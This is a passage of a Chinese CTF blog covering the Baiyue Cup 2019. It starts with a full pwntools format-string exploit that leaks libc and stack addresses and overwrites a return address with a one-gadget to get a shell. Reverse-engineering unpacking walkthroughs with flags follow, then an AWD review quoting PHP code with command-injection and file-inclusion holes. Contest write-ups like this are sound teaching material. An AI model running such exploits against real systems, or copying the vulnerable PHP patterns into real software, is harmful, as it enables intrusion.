<p>名字下面残留有<code>stderr</code>，所以读取名字时,<code>partial overwrite</code>改为<code>_IO_2_1_stdout_-&gt;_fileno</code>，然后把<code>_fileno</code>改为2即可，后面的和<code>pwnable.tw</code>没什么区别，有了泄露，也有了无限格式化字符串攻击，随便怎么玩</p>
<p>exp为:</p>
<pre><code class="python">from pwn import *

def fmtstr(offset, addr, data, written):
    cnt = 0
    payload = &#39;&#39;
    address = &#39;&#39;
    for x in data:
        cur = ord(x)
        if cur &gt;= written&amp;0xff:
            to_add = cur - (written&amp;0xff)
        else:
            to_add = 0x100 + cur - (written&amp;0xff)
        round = &#39;&#39;
        if to_add != 0:
            round += &quot;%{}c&quot;.format(to_add)
        round += &quot;%{}$hhn&quot;.format(offset+cnt+len(data)*2)
        assert(len(round) &lt;= 0x10)
        written += to_add + 0x10 - len(round)
        payload += round.ljust(0x10, &#39;_&#39;)
        address += p64(addr+cnt)
        cnt+=1
    return payload + address


def main(host,port=12001):
    if host:
        p = remote(host,port)
    else:
        # p = process(&quot;./easy_printf&quot;,env={&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;})
        p = process(&quot;./easy_printf&quot;)
        gdb.attach(p,&quot;b *0x000000000400846&quot;)
    p.recvuntil(&quot;write down your name&quot;)
    # t = raw_input(&#39;guess: &#39;)
    t = 0x7
    stdout_fileno = (int(t) &lt;&lt; 12) | 0x690
    p.send(&quot;A&quot;*0x10+p16(stdout_fileno))
    pause()

    buf_addr = 0x601060
    payload =  &quot;%{}c%28$hhn%{}c%58$hn&quot;.format(2,0x2a6).ljust(0x18,&#39;_&#39;)
    payload += fmtstr(9,buf_addr,p64(0x000000000400814)[:3],0x2ab)
    p.send(payload)
    pause()


    payload =  &quot;%{}c%23$hhn%35$p-%36$p^%37$p-%38$p-%39$p*%40$p-&quot;.format(0x14)
    p.send(payload)
    pause()
    p.recvuntil(&quot;^&quot;)
    stack = int(p.recvuntil(&#39;-&#39;,drop=True),16)
    p.recvuntil(&quot;*&quot;)
    libc.address = int(p.recvuntil(&#39;-&#39;,drop=True),16)-0x20837
    info(&quot;stack : &quot; + hex(stack))
    info(&quot;libc : &quot; + hex(libc.address))
    onegadget = 0xf1147+libc.address

    ret_addr = stack - 0x1e8
    payload =  &quot;%{}c%23$hhn&quot;.format(0x14).ljust(0x10,&#39;_&#39;)
    payload += fmtstr(15,ret_addr,p64(onegadget)[:2],0x19)
    p.send(payload)
    pause()
    # :0000000000400865                 retn
    offset = 13
    payload =  &quot;%{}c%16$hhn%{}c%17$hn&quot;.format(ord(p64(onegadget)[2:3]),0x865-ord(p64(onegadget)[2:3])).ljust(0x18,&#39;_&#39;)
    payload += p64(ret_addr+2)+p64(ret_addr-8)
    payload = payload.ljust(0x80,&quot;\x00&quot;)
    p.send(payload)
    p.interactive()
if __name__ == &quot;__main__&quot;:
    libc = ELF(&quot;./libc.so&quot;,checksec=False)
    main(args[&#39;REMOTE&#39;])</code></pre>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="bwarm"><a href="#bwarm" class="headerlink" title="bwarm"></a>bwarm</h3><p>首先，还是查壳，没啥说的 vmp2.0.7</p>
<p> 根据vmp系列脱壳教程，这个壳是1.8以上的方案进行脱壳。先拖入OD，下一个API断点  VirtualProtect (教程建议是下硬件断点，可能是我的OD有问题，硬件断点断不下来，只能是F2断点了 T_T)</p>
<p>然后F9开始跑，测试到第5次跑飞……</p>
<p>那么就在第四次的时开始候单步跟踪，先跳出VirtualProtect 函数 ，然后对代码段设置，内存访问断点</p>
<p>然后F9继续运行，断下来后，在ESP的地方跟踪内存数据，找到SEH结构化异常的上面35C地址那块，下一个硬件写入断点，并取消之前的内存访问断点</p>
<p>然后继续F9运行，再次断下来，这次再在代码断下内存访问断点，然后多次F9运行，注意观察栈帧的变化，快到SEH的地方就接近OEP了，此时已经跟踪到解压后的代码段，然后进行一下代码分析。</p>
<p>完成分析后，代码就还原了，然后单步跟踪，发现OEP </p>
<p>发现OEP后，同时我们也注意到栈帧部分被压入了3条数据，这个就是VMP偷取的代码，我们需要进行还原，于是在当前位置查找一段 0000000000的内存段</p>
<p>然后，对VMP偷取的代码进行patch。最后跳转到OEP 也就是 jmp 012319C9</p>
<p>接着我们把当前的 01231FB5 设置为新的EIP，就可以进行dump内存操作了，填好起始地址和入口地址后，点击脱壳</p>
<p>把脱壳的文件保存为 dump.exe 然后尝试运行，发现不能运行，直接崩溃掉了</p>
<p>于是猜到可能是重定向表的问题造成，用PE编辑器修改一下这里，然后保存。</p>
<p>再次运行，OK ！！</p>
<p>然后可以载入OD进行动态分析了。</p>
<p>为了方便调试，我们知道程序运行后，会提示输入字符串，那么我们先找到输入字符串的地方。</p>
<p>然后开始单步跟踪到这里，就是完成字符串输入后</p>
<p>继续跟踪，我们发现一个base64的字符串：dQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw</p>
<p>那么另外一个字符串就是base64的字典了，也就是：0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz</p>
<p>于是，我们就可以根据这个对base64zi’f字符串进行解密：</p>
<p>坑了，竟然是乱码，还以为就这样搞定了呢，后来请教了一下大神，他说是字典有问题，于是我仔细的看了一下，确实</p>
<p>字典里面按说是不应该有‘=’ 这个字符的，按base64的说法这个是占位用的来补足字节数。所以按照大神的指点，我把大神的脚本用C++重新写了一遍（也是为了更好的理解反向分析的过程），终了跑出来了 T_T</p>
<p>最后，就是见证奇迹的时刻到了 * ^_^ *</p>
<p>flag{e38b5b63-4bf7-4ee8-b422-83f599fe0c43}</p>
<h3 id="Md5Jungle"><a href="#Md5Jungle" class="headerlink" title="Md5Jungle"></a>Md5Jungle</h3><p>首先查壳，丢到exeinfope里面一看，发现是asp的壳。</p>
<p>于是用手头的asp脱壳工具尝试脱壳，发现都不行，不是不支持就是报错！没办法，只能老实手工脱壳了。</p>
<p>根据ESP定律+IAT修复+重定向表修复后，脱壳的程序可以正常运行。</p>
<p>用OD载入后，开始单步跟踪</p>
<p>到用户输入界面，我随便输入了个字符串：111111111（9个1）单步跟入到下图，发现了flag字样</p>
<p>这个应该是flag的头，于是继续跟进，发现确实在核对输入数据与flag{比较，这块就过不去了</p>
<p>于是果断的从来，输入数据为 flag{111111111，来到了下图的地方，在0x16的位置比较0x7D 也就是’}’符号</p>
<p>由于C语言的字符串下标是从0开始的，也就是字符串第23个字符处必须是}</p>
<p>于是构造字符串：flag{11111111111111111} 继续跟进，接下来是在0x7、0xc、0x11处核对字符 ‘-‘ (即：0x2D)</p>
<p>于是字符串就变成了flag{11-1111-1111-1111}，继续跟进，发现了一个字符串：01E3421C=dump_SCY.01E3421C (ASCII “c7218260ef2b966ab0454e07c55cf4e9”)<br>感觉像是MD5的字符串，于是用python解了一下，得到： oh，结之前的flag应该就是flag{oh-1111-1111-1111}</p>
<p>再次输入后，继续跟进发现过去了，开始进行第二段的比较得到了下图的错误：</p>
<p>于是反复跟比较算法也没有找到任何有效的数据，结合本题的提示是md5段字节爆破，估计是这块需要进行爆破处理了。</p>
<p>于是继续python大法，得到字符串：flag{oh-aa30-1111-1111}</p>
<p>继续输入后，单步跟进，此时发现一个字符串：堆栈地址=001DFC30, (ASCII “YTkxYQ==”)   eax=786B5459<br>看起来像B64编码，于是尝试解码，得到第三组的flag值：a91a 。</p>
<p>想起之前用od也看过字符串，于是找到第四组的字符串：NGZicA==   ，解码为：4fbp</p>
<p>那么最终的flag就是：flag{oh-aa30-a91a-4fbp}</p>
<h3 id="shy"><a href="#shy" class="headerlink" title="shy"></a>shy</h3><p> 首先查壳，丢到ExeinfoPE里面看一下，确定是upx壳</p>
<p>于是丢到OD里面进行脱壳处理，由于是压缩壳，跟踪起来比较麻烦，我选择了个偷懒的办法，下一个api访问断点</p>
<p>即：VirtualProtect ，运行3次F9后就跑飞了，于是在2次运行后，单步跟踪，到OEP</p>
<p>使用OD自带的插件进行脱壳，注意基址和OEP的关系，计算好后填入</p>
<p>然后点击脱壳，双击发现不能运行。</p>
<p>这个问题估计是重定向造成，于是修复一下重定向表的数据。</p>
<p>保存后，再次运行可以正常跑起来了</p>
<p>再次用OD载入，发现入口地址不是OEP</p>
<p>按说是已经解密完成了，于是我定位到OEP （0x1072940）一看究竟。</p>
<p>确实已经解密，那么为了方便调试，我直接用OD改一下入口代码就可以实现了。</p>
<p>然后把修改完毕的程序，重新保存到文件，由于有重定位会有下图的提示，点击 是 ，然后右键保存一份dump0.exe</p>
<p>继续，OD载入dump0.exe 发现修改成功，可以直接跳转到OEP行，然后单步跟踪，到输入后，发现后面的代码是个加密处理的代码，于是丢到IDA里面看一下这块对应的反编译代码。</p>
<p>buf 就是用户输入的字符串，if ( <em>(&amp;v4 + j) != v79[j] )   这个就是关键的比较，那么V79[]就应该是异或后的结果，也就是ben本题的密钥，于是在OD中定位值：6ljh,!;:+&amp;p%i*a=Sc4#pt</em>%</p>
<p>接下来就简单了，直接把这个密钥输入，然后再次定位到这块就能得到flag了</p>
<p>最终得到flag：flag{cb7670ab-c597-4b17}   输入到shy.exe 验证一下 : )</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/byb2019/">http://blog.ccreater.top/2020/04/20/byb2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/byb2019/" data-id="cka3ckr2f0019v4v03utuasp8" data-title="百越杯2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-byb2019线下awd" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:51:15.389Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="百越杯总结"><a href="#百越杯总结" class="headerlink" title="百越杯总结"></a>百越杯总结</h1><h2 id="include-require"><a href="#include-require" class="headerlink" title="include,require"></a>include,require</h2><p>如果<strong>文件被包含两次</strong>，PHP 5   <strong>发出致命错误</strong>因为函数已经被定义，但是 PHP 4 不会对在   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.return.html">return</a> 之后定义的函数报错。推荐使用   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include-once.html">include_once</a> 而不是检查文件是否已包含并在包含文件中有条件返回。 </p>
<h2 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once,require_once"></a>include_once,require_once</h2><p><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include.html">include</a>   语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。</p>
<p><em>require_once</em> 语句和 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.require.html">require</a>   语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 </p>
<p><strong>如果所包含文件不存在,include_once不会退出,而require_once会直接退出</strong></p>
<h2 id="比赛失误原因"><a href="#比赛失误原因" class="headerlink" title="比赛失误原因"></a>比赛失误原因</h2><h3 id="log没挂好"><a href="#log没挂好" class="headerlink" title="log没挂好"></a>log没挂好</h3><h3 id="没有找到有效的攻击流量"><a href="#没有找到有效的攻击流量" class="headerlink" title="没有找到有效的攻击流量"></a>没有找到有效的攻击流量</h3><p>grep这个命令不够熟悉,</p>
<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>我的过滤条件变迁:</p>
<p><code>&quot;flag&quot; =&gt; &quot;/flag&quot;</code>,到这里后我就没有继续过滤,”/flag”其实还是有很多干扰信息的,我就差一步</p>
<p><code>grep &quot;/flag &quot; */*</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fl7ptrij30k20arac7.jpg" alt="image.png"></p>
<p><code>grep &quot;/flag &quot; */* -C300 | grep &quot;end pageheader&quot; -C 10</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fk6h3jxj30oa05cdfx.jpg" alt="image.png"></p>
<h3 id="没找到的洞"><a href="#没找到的洞" class="headerlink" title="没找到的洞"></a>没找到的洞</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c2qcxxyj30pl01vdgk.jpg" alt="image.png"></p>
<p>php的web主要也就这两的洞</p>
<h4 id="grayscale"><a href="#grayscale" class="headerlink" title="grayscale"></a>grayscale</h4><p><code>include $_GET[&#39;img&#39;];</code>配合有后门的图片m.jpg</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c4zci7cj30f001g3yg.jpg" alt="image.png"></p>
<p>开始我直接搜索<code>&lt;?</code>和<code>&lt;%</code> 没搜索到就以为是误报,??也能执行?????</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c93p00wj307100zjr6.jpg" alt="image.png"></p>
<p>用strings查看////,编码问题导致??,以后用ascii码来查看</p>
<h4 id="ssystem"><a href="#ssystem" class="headerlink" title="ssystem"></a>ssystem</h4><p>虽然找到了exec那个洞</p>
<p>但是在index.php中：</p>
<pre><code class="php">&lt;?php
if (isset($_GET[&#39;page&#39;])){
    $page = $_GET[&#39;page&#39;];

}else{
        $page = &#39;chart.php&#39;;
}
?&gt;
&lt;?php
    include_once &quot;$page&quot;;
?&gt;</code></pre>
<p>可以配合文件上传拿到shell或者是直接include /flag也能拿到flag</p>
<h3 id="洞没修好"><a href="#洞没修好" class="headerlink" title="洞没修好"></a>洞没修好</h3><h4 id="SSystem"><a href="#SSystem" class="headerlink" title="SSystem"></a>SSystem</h4><pre><code class="php">    &lt;?php
    if (isset($_POST[&#39;name&#39;])){
        $name = $_POST[&#39;name&#39;];
        exec(&quot;tar -cf backup/$name images/*.jpg&quot;);
        echo &quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt;
                导出成功,&lt;a href=&#39;backup/$name&#39;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;;
    }
    ?&gt;</code></pre>
<p>原本以为<code>$name</code>再参数位置,用escapeshellarg就可以了</p>
<p>但是!!!!!!!虽然escapeshellarg会把$name放在引号里面</p>
<pre><code>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 </code></pre><p>php手册里解释是单引号,实际却是<code>tar -cf backup/&quot;123&quot; images/*.jpg</code></p>
<p>?????这是在我本机php5.6的环境下,php7环境也是双引号???</p>
<p>然后在自己的服务器上之前是双引号后面是单引号????</p>
<p>由于不知道靶场上会怎样,我也不确定我用escapeshellarg是不是修好了,然后这题就修补失败了</p>
<p>比较好的修复方案(在实现原功能的情况下去掉命令执行):</p>
<pre><code>exec(&quot;tar -cf backup/aa.tar images/*.jpg&quot;);
rename(&quot;backup/aa.tar&quot;,&quot;backup/$name.tar&quot;);</code></pre><h3 id="没找到check没过的原因"><a href="#没找到check没过的原因" class="headerlink" title="没找到check没过的原因"></a>没找到check没过的原因</h3><p>check的id是172.16.4.7</p>
<p>但是直接搜索 HTTP 没找到check没过的原因,我猜因为拖下来的log只有前半小时,而开局的是否我们的check好像是过的</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我看到洞的时候没有修好</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/byb2019线下awd/">http://blog.ccreater.top/2020/04/20/byb2019线下awd/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/" data-id="cka3ckr2i001hv4v0fkwh2ek6" data-title="百越杯总结" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 10px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16.67px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">拟态防御记录</a>
          </li>
        
          <li>
            <a href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/">2020第三届BJDCTF</a>
          </li>
        
          <li>
            <a href="/2020/05/20/bypass_csp/">bypass_csp</a>
          </li>
        
          <li>
            <a href="/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/">2020年网鼎杯青龙组</a>
          </li>
        
          <li>
            <a href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SpEL表达式注入漏洞</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>